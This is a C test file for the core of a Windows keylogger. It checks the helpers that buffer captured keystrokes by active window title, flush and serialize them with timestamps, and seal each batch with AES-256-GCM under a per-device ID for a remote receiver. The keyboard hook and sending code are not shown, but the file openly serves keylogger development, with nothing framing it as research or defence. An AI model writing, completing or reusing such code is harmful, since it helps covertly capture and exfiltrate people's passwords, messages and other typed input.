// Native test harness for the keylogger's platform-independent core:
// util.c (base64, wide/utf8), buffer.c (event buffering, eviction,
// serialization), crypto.c (AES-256-GCM seal + device id).
//
// The seal test decrypts with BCrypt GCM itself — the same construction the
// receiver uses — so the envelope format (nonce || ct, AAD, 16-byte tag)
// is validated end to end. capture.c's hook machinery is not linked here;
// kbd_title_at is stubbed (buffer.c only calls it during serialization).
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

#include "buffer.h"
#include "crypto.h"
#include "util.h"

// ---- stub for capture.c (not linked) ------------------------------------
static const char *TITLES[] = { "Untitled - Notepad", "Google Chrome" };
const char *kbd_title_at(uint32_t idx)
{
    return TITLES[idx % 2];
}

#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)

// ---- tiny test framework -------------------------------------------------
static int g_failed = 0, g_ran = 0;
#define CHECK(cond, ...) do {                                          \
    g_ran++;                                                            \
    if (!(cond)) {                                                      \
        g_failed++;                                                     \
        printf("  FAIL %s:%d: ", __FILE__, __LINE__);                   \
        printf(__VA_ARGS__);                                           \
        printf("\n");                                                   \
    }                                                                  \
} while (0)

static void push_text(uint64_t ts, uint32_t title, const wchar_t *txt)
{
    KEvent ev;
    memset(&ev, 0, sizeof(ev));
    ev.epoch_ms = ts;
    ev.title_idx = title;
    size_t i = 0;
    for (; txt[i] && i < 7; i++)
        ev.text[i] = txt[i];
    buf_push(&ev);
}

// GCM decrypt used to verify crypto_seal_batch output. Mirrors the receiver.
static bool gcm_open(const uint8_t key[32], const uint8_t nonce[12],
                     const char *aad, size_t aad_len,
                     const uint8_t *ct, size_t ct_len, const uint8_t tag[16],
                     uint8_t *pt_out, size_t pt_cap, size_t *pt_len)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE hkey = NULL;
    bool ok = false;
    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return false;
    if (!NT_SUCCESS(BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
            (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0)))
        goto done;
    if (!NT_SUCCESS(BCryptGenerateSymmetricKey(alg, &hkey, NULL, 0,
            (PUCHAR)key, 32, 0)))
        goto done;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)nonce;
    info.cbNonce = 12;
    info.pbAuthData = (PUCHAR)aad;
    info.cbAuthData = (ULONG)aad_len;
    info.pbTag = (PUCHAR)tag;
    info.cbTag = 16;

    ULONG done_len = 0;
    NTSTATUS st = BCryptDecrypt(hkey, (PUCHAR)ct, (ULONG)ct_len, &info,
                               NULL, 0, pt_out, (ULONG)pt_cap, &done_len, 0);
    if (NT_SUCCESS(st)) {
        *pt_len = done_len;
        ok = true;
    }
done:
    if (hkey) BCryptDestroyKey(hkey);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

int main(void)
{
    // ================= util.c: base64 (RFC 4648 test vectors) =============
    {
        struct { const char *in; size_t n; const char *out; } v[] = {
            { "",       0, ""           },
            { "f",      1, "Zg=="       },
            { "fo",     2, "Zm8="       },
            { "foo",    3, "Zm9v"       },
            { "foob",   4, "Zm9vYg=="   },
            { "fooba",  5, "Zm9vYmE="   },
            { "foobar", 6, "Zm9vYmFy"   },
        };
        for (size_t i = 0; i < sizeof(v) / sizeof(v[0]); i++) {
            char out[32];
            size_t n = b64_encode((const uint8_t *)v[i].in, v[i].n, out);
            CHECK(n == strlen(v[i].out) && strcmp(out, v[i].out) == 0,
                  "b64(\"%s\") = \"%s\", want \"%s\"", v[i].in, out, v[i].out);
        }
        // all 256 byte values -> stable 344-char output, no embedded NULs
        uint8_t all[256];
        for (int i = 0; i < 256; i++) all[i] = (uint8_t)i;
        char out[400];
        size_t n = b64_encode(all, 256, out);
        CHECK(n == 344, "b64(256 bytes) len %zu, want 344", n);
        CHECK(strlen(out) == n, "b64 output not NUL-terminated at len");
        // starts with AAECAwQF (bytes 0,1,2)
        CHECK(memcmp(out, "AAECAwQF", 8) == 0, "b64 prefix mismatch");
    }

    // ================= util.c: wide/utf8 roundtrips ========================
    {
        const char *cases[] = {
            "plain ascii",
            "h\xc3\xa9llo w\xc3\xb6rld",            // latin accents
            "\xe6\x97\xa5\xe6\x9c\xac\xe8\xaa\x9e", // CJK
            "\xf0\x9f\x98\x80!",                     // emoji + ascii
        };
        for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
            wchar_t *w = utf8_to_wide(cases[i]);
            CHECK(w != NULL, "utf8_to_wide(NULL) case %zu", i);
            if (!w) continue;
            char *back = wide_to_utf8(w);
            CHECK(back != NULL, "wide_to_utf8(NULL) case %zu", i);
            if (back) {
                CHECK(strcmp(back, cases[i]) == 0,
                      "roundtrip mismatch case %zu: \"%s\" != \"%s\"",
                      i, back, cases[i]);
                HeapFree(GetProcessHeap(), 0, back);
            }
            HeapFree(GetProcessHeap(), 0, w);
        }
    }

    // ================= util.c: now_ms =====================================
    {
        uint64_t now = now_ms();
        // between 2026-01-01 and 2040-01-01, sanity vs. wildly broken math
        CHECK(now > 1767225600000ULL && now < 2208988800000ULL,
              "now_ms out of plausible range: %llu", (unsigned long long)now);
    }

    // ================= buffer.c: push / count / clear ======================
    {
        buf_init();
        CHECK(buf_count() == 0, "fresh buffer not empty");
        for (int i = 0; i < 100; i++)
            push_text(1000000 + i, 0, L"abc");
        CHECK(buf_count() == 100, "count %zu after 100 pushes, want 100",
              buf_count());
        buf_clear();
        CHECK(buf_count() == 0, "buffer not empty after clear");
    }

    // ================= buffer.c: flush gate ================================
    {
        buf_init();
        uint64_t now = now_ms();
        CHECK(!buf_should_flush(now), "flush due on empty buffer");
        push_text(now, 0, L"x");
        CHECK(!buf_should_flush(now + 1000), "flush due on 1 s old event");
        CHECK(buf_should_flush(now + 61000),
              "flush not due on 61 s old event");
        buf_clear();
        for (int i = 0; i < 256; i++)
            push_text(now, 0, L"x");
        CHECK(buf_should_flush(now), "flush not due at 256 events");
        buf_clear();
    }

    // ================= buffer.c: text-cap eviction =========================
    {
        buf_init();
        // 7 wchar text per event = 14 bytes toward the 64 KiB cap.
        // 5000 events = ~70 KB > cap -> oldest must be dropped, newest kept.
        for (int i = 0; i < 5000; i++)
            push_text(2000000 + i, 0, L"abcdefg");
        size_t n = buf_count();
        CHECK(n < 5000, "eviction did not kick in: %zu events", n);
        CHECK(n > 4000, "evicted too much: only %zu left", n);
        char *s = buf_serialize();
        CHECK(s != NULL, "serialize returned NULL");
        if (s) {
            // every retained event must serialize exactly once
            size_t hits = 0;
            for (const char *p = s; (p = strstr(p, "abcdefg")) != NULL; p++)
                hits++;
            CHECK(hits == n, "serialized %zu events, buffer holds %zu",
                  hits, n);
            CHECK(strstr(s, "Untitled - Notepad") != NULL,
                  "title header missing");
            HeapFree(GetProcessHeap(), 0, s);
        }
        buf_clear();
    }

    // ================= buffer.c: serialization format =======================
    {
        buf_init();
        push_text(1758000000000ULL, 0, L"hello ");
        push_text(1758000000000ULL, 0, L"world");
        push_text(1758000000000ULL, 1, L"chrome");
        char *s = buf_serialize();
        CHECK(s != NULL, "serialize returned NULL");
        if (s) {
            // one header per title switch: 2 headers for 3 events
            CHECK(strstr(s, " | Untitled - Notepad |\n") != NULL,
                  "notepad header missing");
            CHECK(strstr(s, " | Google Chrome |\n") != NULL,
                  "chrome header missing");
            // same-title events concatenate ("hello " + "world"),
            // and the chrome header must come after them
            const char *hw = strstr(s, "hello world");
            const char *gc = strstr(s, "Google Chrome");
            CHECK(hw != NULL, "same-title events not contiguous");
            CHECK(gc != NULL && hw != NULL && gc > hw,
                  "title switch not flagged / out of order");
            CHECK(strstr(s, "\nchrome") != NULL,
                  "post-switch text missing");
            // 1758000000000 ms = 2025-09-16 (UTC, +/- local tz)
            CHECK(strstr(s, "2025-09-1") != NULL,
                  "timestamp stamp missing/wrong: %.30s", s);
            HeapFree(GetProcessHeap(), 0, s);
        }
        buf_clear();
    }

    // ================= crypto.c: device id =================================
    {
        char id1[17], id2[17];
        crypto_device_id(id1);
        crypto_device_id(id2);
        CHECK(strlen(id1) == 16, "device id length %zu, want 16", strlen(id1));
        int hex = 1;
        for (int i = 0; i < 16; i++)
            if (!isxdigit((unsigned char)id1[i])) hex = 0;
        CHECK(hex, "device id not hex: %s", id1);
        CHECK(strcmp(id1, id2) == 0, "device id not stable across calls");
    }

    // ================= crypto.c: seal + GCM roundtrip =====================
    {
        uint8_t key[32];
        for (int i = 0; i < 32; i++) key[i] = (uint8_t)(i * 7 + 1);
        const char *aad = "0123456789abcdef";
        const char *pt = "the quick brown fox \xe6\x97\xa5\xe6\x9c\xac";
        size_t pt_len = strlen(pt);

        uint8_t nonce[12], tag[16], *ct = NULL;
        size_t ct_len = 0;
        CHECK(crypto_seal_batch(key, aad, strlen(aad),
                               (const uint8_t *)pt, pt_len,
                               nonce, &ct, &ct_len, tag),
              "crypto_seal_batch failed");
        if (ct) {
            CHECK(ct_len == pt_len, "GCM ct len %zu != pt len %zu", ct_len, pt_len);

            uint8_t back[128];
            size_t back_len = 0;
            CHECK(gcm_open(key, nonce, aad, strlen(aad), ct, ct_len, tag,
                          back, sizeof(back), &back_len),
                  "decrypt of sealed batch failed");
            CHECK(back_len == pt_len && memcmp(back, pt, pt_len) == 0,
                  "roundtrip plaintext mismatch");

            // tampered ciphertext must fail authentication
            uint8_t bad_ct = ct[0] ^ 0x01;
            CHECK(!gcm_open(key, nonce, aad, strlen(aad), &bad_ct, 1, tag,
                           back, sizeof(back), &back_len),
                  "tampered ciphertext accepted");

            // wrong AAD (device id) must fail authentication
            CHECK(!gcm_open(key, nonce, "ffffffffffffffff", 16, ct, ct_len,
                            tag, back, sizeof(back), &back_len),
                  "wrong AAD accepted");

            // wrong key must fail authentication
            uint8_t bad_key[32];
            memcpy(bad_key, key, 32);
            bad_key[0] ^= 0xFF;
            CHECK(!gcm_open(bad_key, nonce, aad, strlen(aad), ct, ct_len, tag,
                           back, sizeof(back), &back_len),
                  "wrong key accepted");

            HeapFree(GetProcessHeap(), 0, ct);
        }

        // nonces must be unique across seals (random 96-bit)
        uint8_t n1[12], n2[12], t[16];
        uint8_t *c1 = NULL, *c2 = NULL;
        size_t l1 = 0, l2 = 0;
        CHECK(crypto_seal_batch(key, aad, 16, (const uint8_t *)"x", 1,
                               n1, &c1, &l1, t) &&
              crypto_seal_batch(key, aad, 16, (const uint8_t *)"x", 1,
                               n2, &c2, &l2, t),
              "seal failed");
        if (c1 && c2) {
            CHECK(memcmp(n1, n2, 12) != 0, "nonce reused across seals");
            HeapFree(GetProcessHeap(), 0, c1);
            HeapFree(GetProcessHeap(), 0, c2);
        }
    }

    printf("%s: %d checks, %d failed\n",
           g_failed ? "FAILED" : "PASSED", g_ran, g_failed);
    return g_failed ? 1 : 0;
}
